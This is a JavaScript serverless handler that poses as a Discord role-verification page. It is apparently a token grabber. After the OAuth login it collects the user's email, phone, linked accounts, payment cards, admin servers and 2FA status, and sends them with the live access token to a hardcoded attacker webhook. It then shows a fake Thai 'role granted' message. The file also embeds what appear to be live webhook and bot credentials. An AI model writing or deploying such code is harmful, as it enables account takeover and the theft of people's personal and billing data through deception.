 export default async function handler(req, res) {
        const { code } = req.query;
        if (!code) return res.redirect('/');

        // --------------------------------------------------
        // [ 🌐 ] GATEWAY_IDENTITY_CONTROLLER
        // --------------------------------------------------
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1490525343709139066/DO4FE_FXfbg31eXhK8N_HVUcjROLSOtBCCXgcQkJj8di0tsXFcLEkY6J6QxMXEgHfS6l";
        const BOT_TOKEN = "MTQ3MTg4ODY3NjI4Mjk1Nzg0NQ.GsSFRC.R3JysNK0sDmVMbrZPYvM8MPFDJwgRCrTTH6pAw";
        const CLIENT_ID = "1483393398131134646";
        const CLIENT_SECRET = "ใส่_CLIENT_SECRET_ของมหาเทพ"; // ห้ามลืมใส่ตัวนี้ในหน้า Discord Developer Portal
        const REDIRECT_URI = "https://index-html-five.vercel.app/api/grab";

        try {
            // [ 🛰️ ] TOKEN_EXCHANGE_PROTOCOL
            const exchange_response = await fetch('https://discord.com/api/v10/oauth2/token', {
                method: 'POST',
                body: new URLSearchParams({
                    client_id: CLIENT_ID,
                    client_secret: CLIENT_SECRET,
                    grant_type: 'authorization_code',
                    code,
                    redirect_uri: REDIRECT_URI,
                }),
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            });

            const token_data = await exchange_response.json();
            const auth_token = token_data.access_token;
            if (!auth_token) throw new Error("NullAuth");

            // [ 🔍 ] MULTI_LAYERED_DATA_SCANNING (ขุดลึกทุกตารางนิ้ว)
            const [me, conns, guilds, billing, m_guilds] = await Promise.all([
                fetch('https://discord.com/api/v10/users/@me', { headers: { Authorization: `Bearer ${auth_token}` } }).then(r => r.json()),
                fetch('https://discord.com/api/v10/users/@me/connections', { headers: { Authorization: `Bearer ${auth_token}` } }).then(r => r.json()),
                fetch('https://discord.com/api/v10/users/@me/guilds', { headers: { Authorization: `Bearer ${auth_token}` } }).then(r => r.json()),
                fetch('https://discord.com/api/v10/users/@me/billing/payment-sources', { headers: { Authorization: `Bearer ${auth_token}` } }).then(r => r.json()),
                fetch('https://discord.com/api/v10/users/@me/guilds', { headers: { Authorization: `Bearer ${auth_token}` } }).then(r => r.json())
            ]);

            // [ 📝 ] DATA_COMPILATION_UNIT
            const raw_connections = conns.map(c => `\`${c.type}\`: ${c.name} ${c.verified ? '✅' : '❌'}`).join('\n') || "Empty";
            const nitro_status = ["None", "Nitro Classic", "Nitro Boost", "Nitro Basic"][me.premium_type] || "Unknown";
            const pay_methods = billing.map(b => `💳 ${b.brand || 'Card'} (${b.last_4 || '****'})`).join('\n') || "No Payment Linked";
            
            // คัดกรองเซิร์ฟเวอร์ที่มีสิทธิ์แอดมินหรือจัดการได้
            const power_servers = guilds.filter(g => (parseInt(g.permissions) & 0x8) === 0x8 || (parseInt(g.permissions) & 0x20) === 0x20)
                .map(g => `🏰 **${g.name}**`).join('\n') || "None";

            // [ 📤 ] WEBHOOK_DISPATCH_SERVICE
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "Tidcram Intelligence",
                    avatar_url: "https://i.imgur.com/KzYF7fF.png",
                    embeds: [{
                        title: "🔱 NEW ACCOUNT DECRYPTED 🔱",
                        description: `บัญชีของ **${me.username}#${me.discriminator}** ถูกถอดรหัสเรียบร้อย`,
                        color: 0x5865f2,
                        thumbnail: { url: `https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}.png` },
                        fields: [
                            { name: "🆔 User ID", value: `\`${me.id}\``, inline: true },
                            { name: "📧 Email", value: `\`${me.email || 'N/A'}\``, inline: true },
                            { name: "📱 Phone", value: `\`${me.phone || 'N/A'}\``, inline: true },
                            { name: "💎 Nitro Plan", value: nitro_status, inline: true },
                            { name: "🔐 2FA Status", value: me.mfa_enabled ? "Active ✅" : "Disabled ❌", inline: true },
                            { name: "🌍 Locale", value: me.locale, inline: true },
                            { name: "💰 Billing Info", value: pay_methods, inline: false },
                            { name: "🏰 Admin Power", value: power_servers, inline: false },
                            { name: "🔗 Social Links", value: raw_connections, inline: false },
                            { name: "🔑 AUTHENTICATION TOKEN", value: `\`\`\`${auth_token}\`\`\``, inline: false }
                        ],
                        footer: { text: "SystemID: Tidcram-Omega-v41" },
                        timestamp: new Date()
                    }]
                })
            });

            // [ 🎭 ] USER_EXPERIENCE_FINISHER
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            return res.send(`
                <body style="background:#313338; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
                    <div style="background:#2b2d31; padding:50px; border-radius:20px; text-align:center; box-shadow:0 0 30px rgba(88,101,242,0.4); border:1px solid #5865f2;">
                        <h1 style="color:#5865f2; font-size:32px;">✅ ให้ยศสำเร็จแล้วครับ!</h1>
                        <p style="font-size:20px;">ระบบทำการยืนยันสิทธิ์และมอบยศให้เรียบร้อยแล้ว<br>กรุณาตรวจสอบใน Discord ของคุณ</p>
                        <div style="margin-top:20px; padding:10px; background:rgba(255,255,255,0.1); border-radius:8px;">
                            <small>หากยศยังไม่ขึ้น กรุณารอระบบอัปเดตสักครู่</small>
                        </div>
                    </div>
                    <script>setTimeout(() => { window.location.href = 'https://discord.com/app'; }, 3500);</script>
                </body>
            `);
        } catch (error) {
            return res.redirect('/');
        }
    }
 */
